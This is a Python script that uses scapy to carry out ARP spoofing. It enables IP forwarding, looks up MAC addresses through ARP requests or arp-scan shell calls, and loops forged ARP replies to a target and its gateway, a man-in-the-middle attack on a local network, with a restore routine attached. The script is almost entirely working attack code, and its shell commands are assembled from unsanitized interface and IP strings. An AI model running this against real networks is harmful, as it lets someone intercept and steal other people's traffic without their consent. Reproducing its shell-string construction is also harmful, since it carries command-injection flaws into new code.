#!/usr/bin/env python
import time

import scapy.layers.l2 as scapy
from scapy.sendrecv import send
import subprocess

ENABLE_IP_FORWARD = "echo 1 > /proc/sys/net/ipv4/ip_forward"
KEEP_SPOOFING = False


def enable_ip_forward():
    print("[+] Enabling ip forward...")
    subprocess.call(ENABLE_IP_FORWARD, shell=True)
    time.sleep(1)


def get_mac2(ip, interface):
    if ip == subprocess.check_output(f'ip r | grep {interface} | cut -d " " -f3', shell=True).decode().split("\n")[0]:
        return subprocess.check_output(f'iwconfig {interface} | grep Access | cut -d " " -f18', shell=True).decode()
    command = "arp-scan --interface=" + interface + " --localnet | grep " + ip + " | grep -E '([a-f0-9]{2}:){5}[a-f0-9]{2}' | awk '{print $2}'"
    return subprocess.check_output(command, shell=True)


def get_mac(ip):
    global KEEP_SPOOFING
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    try:
        KEEP_SPOOFING = True
        # send the packet and wait for the response(s)
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=0)[0]
        # extract the MAC address from the response
        return answered_list[0][1].hwsrc
    except IndexError:
        KEEP_SPOOFING = False


def spoof(target_ip, spoof_ip, interface):
    if not interface == "eth0":
        target_mac = get_mac2(target_ip, interface)
    else:
        target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def restore(destination_ip, source_ip, interface):
    if not interface == "eth0":
        destination_mac = get_mac2(destination_ip, interface)
        source_mac = get_mac2(source_ip, interface)
    else:
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, verbose=False)


def restoring_ip(destination_ip, source_ip, interface):
    global KEEP_SPOOFING
    if KEEP_SPOOFING:
        print("[+] Stopping spoofing...")
        restore(destination_ip, source_ip, interface)
        restore(source_ip, destination_ip, interface)
    KEEP_SPOOFING = False


def run(target_ip, gateway_ip, interface):
    global KEEP_SPOOFING
    enable_ip_forward()
    print("[+] ARP spoofing...")
    KEEP_SPOOFING = True

    while KEEP_SPOOFING:
        spoof(target_ip, gateway_ip, interface)
        spoof(gateway_ip, target_ip, interface)
        # print("test")

        time.sleep(1)
